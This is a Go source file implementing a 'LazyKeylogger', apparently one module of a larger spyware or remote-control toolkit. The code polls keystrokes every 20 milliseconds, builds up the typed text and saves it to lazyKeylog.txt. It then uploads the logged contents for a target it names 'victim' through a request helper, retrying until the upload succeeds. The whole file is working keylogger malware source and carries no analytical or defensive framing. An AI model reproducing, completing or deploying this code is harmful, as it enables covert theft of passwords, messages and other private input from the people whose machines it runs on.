package services

import (
	"fmt"
	"main/utils"
	"os"
	"time"
)

const LazyKeylogFilename = "lazyKeylog.txt"

type LazyKeylogger struct {
	Keylogger
}

func (kl *LazyKeylogger) Communicate(victim string) {

	for {
		file, err := os.OpenFile(fmt.Sprintf(LazyKeylogFilename), os.O_RDONLY, 0755)
		if err != nil {
			utils.HandleError(err.Error(), victim)
			fmt.Println("No keylog history exists")
		} else {
			content := utils.GetFileContent(file)
			_, err := utils.HandleLazyKeylogRequest(content, victim)
			if err != nil {
				utils.HandleError(err.Error(), victim)
				fmt.Println("Error making the request")
			} else {
				break
			}
		}
		time.Sleep(10 * time.Second)
	}

	for {
		select {
		case <-kl.Channel:
			return
		default:
			time.Sleep(10 * time.Second)
			kl.Mutex.Lock()
			if text != "" {
				kl.saved += text
				text = ""
				kl.Mutex.Unlock()
			} else {
				kl.Mutex.Unlock()
				if kl.saved != "" {
					err := utils.AppendToFile(LazyKeylogFilename, kl.saved)
					if err != nil {
						utils.HandleError(err.Error(), victim)
						fmt.Println("Error making the request")
					} else {
						kl.saved = ""
					}
				}
			}
		}
	}
}

func (kl *LazyKeylogger) Start() {
	for {
		select {
		case <-kl.Channel:
			kl.Channel = make(chan struct{})
			return
		default:
			time.Sleep(time.Millisecond * 20)
			pressed := kl.GetKey()
			let := kl.ParseKeycode(pressed.keyCode)
			if pressed.changed {
				kl.Mutex.Lock()
				if len(text) == 0 || let[0] != text[len(text)-1] {
					text += let
				}
				kl.Mutex.Unlock()
			}
		}
	}
}
